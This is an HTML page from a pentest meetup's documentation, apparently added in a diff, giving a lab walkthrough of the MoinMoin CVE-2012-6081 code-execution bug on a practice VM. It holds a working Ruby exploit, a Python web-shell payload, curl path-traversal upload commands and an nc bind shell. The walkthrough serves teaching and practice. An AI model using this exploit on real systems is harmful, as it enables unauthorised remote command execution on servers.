@@ -1,0 +1,558 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
+<meta content="nosniff" http-equiv="X-Content-Type-Options" />
+<meta content="deny" http-equiv="X-Frame-Options" />
+<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
+<meta content="strict-origin" http-equiv="Referrer-Policy" />
+<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
+<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.2. MoinMoin &mdash; South Bay WASP 1.0.3 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="3.3. OwlNest" href="owlnest.html" />
+    <link rel="prev" title="3.1. Finding and running challenges" href="VWADP.html" /> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.2. MoinMoin</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#a-real-world-moinmoin-exploit-of-debian">3.2.1. A real-world MoinMoin exploit of Debian</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#the-challenge">3.2.1.1. The challenge</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#the-software-fix">3.2.1.2. The software fix</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#a-100-byte-exploit">3.2.2. A 100-byte exploit</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#tar-and-100-byte-filenames">3.2.2.1. <code class="docutils literal notranslate"><span class="pre">tar</span></code> and 100 byte filenames</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#fitting-an-exploit-in-100-bytes">3.2.2.2. Fitting an exploit in 100 bytes</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#getting-the-form-parameters">3.2.3. Getting the form parameters</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#the-exploit-using-bash">3.2.4. The exploit using bash</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#upload-the-python-exploit">3.2.4.1. Upload the python exploit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#the-reverse-shell">3.2.4.2. The reverse shell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.3. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.4. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.5. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.6. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.7. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.8. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.9. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.10. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.11. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.12. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.13. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.14. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.15. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.16. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.17. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.18. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.19. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.20. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.21. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.22. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.23. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.24. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.25. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.26. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.27. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.28. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.29. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.2. MoinMoin</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/moinmoin.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="moinmoin">
+<span id="id21"></span><h1>3.2. MoinMoin<a class="headerlink" href="#moinmoin" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="a-real-world-moinmoin-exploit-of-debian">
+<h2>3.2.1. A real-world MoinMoin exploit of Debian<a class="headerlink" href="#a-real-world-moinmoin-exploit-of-debian" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="the-challenge">
+<h3>3.2.1.1. The challenge<a class="headerlink" href="#the-challenge" title="Permalink to this headline">¶</a></h3>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentesterlab.com/exercises/cve-2012-6081">CVE-2012-6081: MoinMoin code execution</a>. This document owes much to two writeups. First <a class="reference external" href="https://pentesterlab.com/exercises/cve-2012-6081/course">CVE-2012-6081: MoinMoin code execution - Introduction</a> which shows a <code class="docutils literal notranslate"><span class="pre">ruby</span></code>-based exploit, and <a class="reference external" href="https://github.com/shaynewang/exploits/blob/master/moinmoin.py">GitHub shaynewang/exploits/moinmoin.py</a> which shows a <code class="docutils literal notranslate"><span class="pre">python3</span></code>-based exploit.</p>
+<p>Please review <a class="reference external" href="https://github.com/shaynewang/exploits">GitHub shaynewang/exploits CVE-2012-6081: MoinMoin code execution</a> for the key vulnerabilites being exploited plus the fact that the browsers you likely have on hand (Firefox and Chrome) won’t run the required Java applet.</p>
+<p>What we’ll add here is doing the exploit using the bash shell.</p>
+</div>
+<div class="section" id="the-software-fix">
+<h3>3.2.1.2. The software fix<a class="headerlink" href="#the-software-fix" title="Permalink to this headline">¶</a></h3>
+<p>The problem was an injection of user data, which is fixed via these highlighted lines:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>def execute<span class="o">(</span>pagename, request<span class="o">)</span>:
+    <span class="nv">target</span> <span class="o">=</span> request.values.get<span class="o">(</span><span class="s1">&#39;target&#39;</span><span class="o">)</span>
+<span class="hll">    <span class="nv">target</span> <span class="o">=</span> wikiutil.taintfilename<span class="o">(</span>target<span class="o">)</span>
+</span><span class="hll">
+</span>    <span class="nv">cwd</span> <span class="o">=</span> AnyWikiDraw<span class="o">(</span>request, pagename, target<span class="o">)</span>
+
+    <span class="k">do</span> <span class="o">=</span> request.values.get<span class="o">(</span><span class="s1">&#39;do&#39;</span><span class="o">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="a-100-byte-exploit">
+<h2>3.2.2. A 100-byte exploit<a class="headerlink" href="#a-100-byte-exploit" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="tar-and-100-byte-filenames">
+<h3>3.2.2.1. <code class="docutils literal notranslate"><span class="pre">tar</span></code> and 100 byte filenames<a class="headerlink" href="#tar-and-100-byte-filenames" title="Permalink to this headline">¶</a></h3>
+<p>From <a class="reference external" href="https://www.gnu.org/software/tar/manual/html_chapter/tar_8.html#SEC145">GNU and old GNU tar format</a>: “GNU tar was based on an early draft of the POSIX 1003.1 ustar standard. GNU extensions to tar, such as the support for file names longer than 100 characters, use portions of the tar header record which were specified in that POSIX draft as unused.”</p>
+<p>This leads to filenames longer than 100 bytes <strong>not</strong> being the first bytes in a tar file containing exactly 1 file:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># 100 byte filenames start the tar archive</span>
+</span><span class="nv">NAME100</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">&quot;0123456789%.0s&quot;</span> <span class="o">{</span><span class="m">0</span>..9<span class="o">}</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="si">${#</span><span class="nv">NAME100</span><span class="si">}</span>
+<span class="c1"># OUTPUT:</span>
+<span class="c1"># 100</span>
+<span class="nb">echo</span> <span class="s2">&quot;hello&quot;</span> &gt; <span class="nv">$NAME100</span>
+tar --create --file tar100.tar <span class="nv">$NAME100</span>
+cat tar100.tar
+<span class="c1"># OUTPUT:</span>
+<span class="c1"># 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414615023236 0ustar  hacker12hacker12hello</span>
+
+<span class="c1"># &gt;= 101 byte filenames do not start the tar archive</span>
+<span class="nv">NAME101</span><span class="o">=</span><span class="si">${</span><span class="nv">NAME100</span><span class="si">}</span><span class="m">0</span>
+<span class="nb">echo</span> <span class="si">${#</span><span class="nv">NAME101</span><span class="si">}</span>
+<span class="c1"># OUTPUT:</span>
+<span class="c1"># 101</span>
+<span class="nb">echo</span> <span class="s2">&quot;hello&quot;</span> &gt; <span class="nv">$NAME101</span>
+tar --create --file tar101.tar <span class="nv">$NAME101</span>
+cat tar101.tar
+<span class="c1"># ././@LongLink0000644000000000000000000000014600000000000011604 Lustar  rootroot0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789001234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414743023240 0ustar  hacker12hacker12hello</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="fitting-an-exploit-in-100-bytes">
+<h3>3.2.2.2. Fitting an exploit in 100 bytes<a class="headerlink" href="#fitting-an-exploit-in-100-bytes" title="Permalink to this headline">¶</a></h3>
+<p>The exploit is based on a file upload that is stored in a tar archive where:</p>
+<ul class="simple">
+<li>You control the tar archive filename: moinexec.py so it’s treated by MoinMoin as an executable python file and not a tar file.</li>
+<li>You mostly control the filename for the input file to tar: “debug.” + an extension, which can textually be python code.</li>
+<li>As long as the “filename” (python code) is &lt;= 100 bytes, it will be the first bytes in the tar archive: you have uploaded executable python code.</li>
+</ul>
+<p>Here is a simple python script to execute a shell command:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">import os
+</span>def execute<span class="o">(</span>pagename, request<span class="o">)</span>:
+  <span class="nv">stream</span> <span class="o">=</span> os.popen<span class="o">(</span>request.values<span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span>
+  request.write<span class="o">(</span>stream.read<span class="o">())</span>
+</pre></div>
+</div>
+<p>But this code must have the filename “drawing[.ext]” where “drawing” is fixed and the extension we can control. Here goes the next attempt:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">cat &gt; cmd.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
+</span><span class="s">drawing.z if()else()</span>
+<span class="s">import os</span>
+<span class="s">def execute(pagename, request):</span>
+<span class="s">  stream = os.popen(request.values[&#39;cmd&#39;])</span>
+<span class="s">  request.write(stream.read())</span>
+<span class="s">EOF</span>
+wc -c cmd.py
+<span class="c1"># OUTPUT:</span>
+<span class="c1"># 137</span>
+</pre></div>
+</div>
+<p>That’s too long, so reaching in the python bag of tricks, this does the job:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">cat &gt; payload.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
+</span><span class="s">drawing.r if()else()</span>
+<span class="s">import os</span>
+<span class="s">def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;</span>
+<span class="s">EOF</span>
+wc -c payload.py
+</pre></div>
+</div>
+<p>It’s actually possible to shrink the size down even further by passing the shell command in the HTTP Host header (<code class="docutils literal notranslate"><span class="pre">Host:</span> <span class="pre">uname</span> <span class="pre">-a</span></code>), but we won’t do that.</p>
+</div>
+</div>
+<div class="section" id="getting-the-form-parameters">
+<h2>3.2.3. Getting the form parameters<a class="headerlink" href="#getting-the-form-parameters" title="Permalink to this headline">¶</a></h2>
+<p>Normally you’d use something like <strong class="program">zap</strong> or <strong class="program">burpsuite</strong> to intercept browser traffic and determine the form parameters. Since you probably don’t have a Java-capable browser handy, you can run the PentesterLab ruby exploit and use <code class="docutils literal notranslate"><span class="pre">ngrep</span></code> to capture the form traffic. NOTE: the code has 1 correction from the original PentesterLab writeup:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Update /etc/hosts to have vulnerable host</span>
+<span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.122.99
+<span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$IP</span><span class="s2"> vulnerable&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+
+cat &gt; exploit.rb <span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">require &#39;socket&#39;</span>
+
+<span class="s"># function used to send request</span>
+<span class="s"># does not support chunk, gzip, zlib :p</span>
+<span class="s">def ssend(req) #{{</span>
+<span class="s">  socket=TCPSocket.new(&#39;vulnerable&#39;,80)</span>
+<span class="s">  puts req</span>
+<span class="s">  socket.write(req)</span>
+<span class="s">  resp = &quot;&quot;</span>
+<span class="s">  s=&quot;&quot;</span>
+<span class="s">  while (s= socket.readline and !s.nil? )</span>
+<span class="s">    puts s</span>
+<span class="s">    resp+= s</span>
+<span class="s">    break if s =~ /^\r\n$/</span>
+<span class="s">  end</span>
+<span class="s">  if resp=~ /^Content-Length:\s+(\d+)\s*$/i</span>
+<span class="s">    resp+= socket.read($1.to_i)</span>
+<span class="s">  else</span>
+<span class="s">    resp = socket.read</span>
+<span class="s">  end</span>
+<span class="s">  resp</span>
+<span class="s">end #}}</span>
+
+<span class="s"># getting  valid ticket</span>
+<span class="s">resp = ssend(&quot;GET /moin/WikiSandBox?action=twikidraw&amp;do=modify&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.0\r\nHost: vulnerable\r\n\r\n&quot;)</span>
+<span class="s"># CORRECTION HERE &quot;&amp;&quot; ==&gt; &quot;&amp;amp;&quot;</span>
+<span class="hll"><span class="s"># OLD - if resp =~ /ticket=(.*?)&amp;target=/</span>
+</span><span class="hll"><span class="s">if resp =~ /ticket=(.*?)&amp;amp;target=/</span>
+</span><span class="hll"><span class="s">  ticket = $1</span>
+</span><span class="s">end</span>
+
+<span class="s">head = &quot;POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=#{ticket}&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.1\r\nHost: vulnerable\r\nContent-Type: multipart/form-data; boundary=pentesterlab\r\nContent-Length: &quot;</span>
+
+<span class="s">payload = &quot;drawing.s if()else()\nimport os\ndef execute(p,r):exec\&quot;print&gt;&gt;r,os\\56popen(r\\56values[&#39;c&#39;])\\56read()\&quot;&quot;</span>
+
+<span class="s"># Building the request&#39;s body:</span>
+
+<span class="s">body = &quot;--pentesterlab\r\n&quot;</span>
+
+<span class="s"># Payload:</span>
+<span class="s">body += &quot;Content-Disposition: form-data; name=\&quot;filename\&quot;\r\nContent-Type: image/png\r\n\r\n#{payload}\r\n--pentesterlab\r\n&quot;</span>
+
+<span class="s"># File content:</span>
+<span class="s">body += &quot;Content-Disposition: form-data; name=\&quot;filepath\&quot;; filename=\&quot;drawing.png\&quot;\r\nContent-Type: image/png\r\n\r\nBLAH\r\n--pentesterlab--\r\n&quot;</span>
+
+<span class="s">#Final request</span>
+<span class="s">puts head+body.size.to_s+&quot;\r\n\r\n&quot;+body</span>
+<span class="s">puts ssend(head+body.size.to_s+&quot;\r\n\r\n&quot;+body)</span>
+<span class="s">EOF</span>
+</pre></div>
+</div>
+<p>In one terminal window start <code class="docutils literal notranslate"><span class="pre">ngrep</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">LINK</span><span class="o">=</span>virbr0
+</span>sudo ngrep -l -p -d <span class="nv">$LINK</span> <span class="se">\</span>
+  <span class="s2">&quot;^GET |^POST &quot;</span> tcp and port <span class="m">80</span> and host vulnerable
+</pre></div>
+</div>
+<p>In another terminal run the ruby exploit:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">ruby exploit.rb
+</span></pre></div>
+</div>
+<p>The captured data is:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">#####################################
+</span>T 192.168.122.1:52262 -&gt; 192.168.122.99:80 [AP] #144
+  GET /moin/WikiSandBox?action=twikidraw&amp;do=modify&amp;target=../../../../data/pl
+  ugin/action/moinexec.py HTTP/1.0..Host: vulnerable....
+#################################
+T 192.168.122.1:52264 -&gt; 192.168.122.99:80 [AP] #177
+  POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=&amp;target=../../../../
+  data/plugin/action/moinexec.py HTTP/1.1..Host: vulnerable..Content-Type: mu
+  ltipart/form-data; boundary=pentesterlab..Content-Length: 333....--penteste
+  rlab..Content-Disposition: form-data; name=&quot;filename&quot;..Content-Type: image/
+  png....drawing.s if()else().import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56p
+  open(r\56values[&#39;c&#39;])\56read()&quot;..--pentesterlab..Content-Disposition: form-
+  data; name=&quot;filepath&quot;; filename=&quot;drawing.png&quot;..Content-Type: image/png....B
+  LAH..--pentesterlab--..
+</pre></div>
+</div>
+<p>Cleaned up the POST looks like:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">POST /moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=&amp;target=../../../../data/plugin/action/moinexec.py HTTP/1.1
+</span>Host: vulnerable
+Content-Type: multipart/form-data; boundary=pentesterlab
+Content-Length: 333
+
+--pentesterlab
+Content-Disposition: form-data; name=&quot;filename&quot;
+Content-Type: image/png
+
+drawing.s if()else()
+import os.def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;
+--pentesterlab
+Content-Disposition: form-data; name=&quot;filepath&quot;;filename=&quot;drawing.png&quot;
+Content-Type: image/png
+
+BLAH
+--pentesterlab--
+</pre></div>
+</div>
+<p>When done, stop the <code class="docutils literal notranslate"><span class="pre">ngrep</span></code> capture. The first HTTP request is equivalent to this <code class="docutils literal notranslate"><span class="pre">curl</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl --silent --get http://<span class="nv">$TARGET</span>/moin/WikiSandBox <span class="se">\</span>
+</span>  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
+  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
+  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py
+</pre></div>
+</div>
+<p>From the ruby code, the whole purpose of this is to get a ticket to be used in the second request. Here goes the gist of the second request (note that TICKET and PAYLOAD strings haven’t been defined yet):</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl -v --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=</span><span class="nv">$TICKET</span><span class="s2">&amp;target=../../../../data/plugin/action/moinexec.py&quot;</span> <span class="se">\</span>
+</span>  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
+  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span>
+</pre></div>
+</div>
+<p>Note this is a mix of HTTP GET and a POST with <code class="docutils literal notranslate"><span class="pre">multipart/form-data</span></code>: you cannot use <code class="docutils literal notranslate"><span class="pre">--data-urlencode</span></code> as <code class="docutils literal notranslate"><span class="pre">curl</span></code> does not allow mixiing <code class="docutils literal notranslate"><span class="pre">--data-urlencode</span></code> and <code class="docutils literal notranslate"><span class="pre">--form</span></code>.</p>
+<p>Note that it’s likely MoinMoin is located at <code class="file docutils literal notranslate"><span class="pre">/var/www/moin</span></code> and the plugin directory is at <code class="file docutils literal notranslate"><span class="pre">/var/lib/moin/data/plugin/action/</span></code></p>
+</div>
+<div class="section" id="the-exploit-using-bash">
+<h2>3.2.4. The exploit using bash<a class="headerlink" href="#the-exploit-using-bash" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="upload-the-python-exploit">
+<h3>3.2.4.1. Upload the python exploit<a class="headerlink" href="#upload-the-python-exploit" title="Permalink to this headline">¶</a></h3>
+<p>This uploads the python exploit. Make sure that the target file does not already exist (delete it or choose an unused filename if it does).</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># NOTE: vulnerable must be in /etc/hosts</span>
+</span><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+
+<span class="nv">TICKET</span><span class="o">=</span><span class="k">$(</span>curl -v --silent --get http://<span class="nv">$TARGET</span>/moin/WikiSandBox <span class="se">\</span>
+  --data-urlencode <span class="nv">action</span><span class="o">=</span>twikidraw <span class="se">\</span>
+  --data-urlencode <span class="k">do</span><span class="o">=</span>modify <span class="se">\</span>
+  --data-urlencode <span class="nv">target</span><span class="o">=</span>../../../../data/plugin/action/moinexec.py <span class="se">\</span>
+  <span class="p">|</span> grep <span class="s1">&#39;ticket=&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*ticket=//;s/\&amp;.*//&#39;</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="nv">ticket</span><span class="o">=</span><span class="nv">$TICKET</span>
+
+cat &gt; payload.py <span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">drawing.r if()else()</span>
+<span class="s">import os</span>
+<span class="s">def execute(p,r):exec&quot;print&gt;&gt;r,os\56popen(r\56values[&#39;c&#39;])\56read()&quot;</span>
+<span class="s">EOF</span>
+<span class="nv">PAYLOAD</span><span class="o">=</span><span class="k">$(</span>cat payload.py<span class="k">)</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;BLAH&quot;</span> &gt; drawing.png
+
+curl -v --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox?action=twikidraw&amp;do=save&amp;ticket=</span><span class="nv">$TICKET</span><span class="s2">&amp;target=../../../../data/plugin/action/moinexec.py&quot;</span> <span class="se">\</span>
+  --form <span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAYLOAD</span><span class="s2">&quot;</span> <span class="se">\</span>
+  --form <span class="nv">filepath</span><span class="o">=</span><span class="s2">&quot;@drawing.png;type=image/png&quot;</span> <span class="se">\</span>
+  --trace-ascii -
+</pre></div>
+</div>
+</div>
+<div class="section" id="the-reverse-shell">
+<h3>3.2.4.2. The reverse shell<a class="headerlink" href="#the-reverse-shell" title="Permalink to this headline">¶</a></h3>
+<p>In one terminal window start up a shell using <code class="docutils literal notranslate"><span class="pre">nc</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+</span>curl --silent <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/moin/WikiSandBox&quot;</span> <span class="se">\</span>
+  --data-urlencode <span class="nv">action</span><span class="o">=</span>moinexec <span class="se">\</span>
+  --data-urlencode <span class="s2">&quot;c=nc -l -p 9999 -e /bin/sh&quot;</span>
+</pre></div>
+</div>
+<p>In another terminal window connect to the reverse shell:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">TARGET</span><span class="o">=</span>vulnerable
+</span><span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
+nc <span class="nv">$TARGET</span> <span class="nv">$PORT</span>
+<span class="c1"># In the resulting shell</span>
+python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+id
+hostname
+uname -a
+<span class="nb">pwd</span>
+<span class="nb">exit</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="owlnest.html" class="btn btn-neutral float-right" title="3.3. OwlNest" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="VWADP.html" class="btn btn-neutral" title="3.1. Finding and running challenges" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.3',
+            LANGUAGE:'None',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
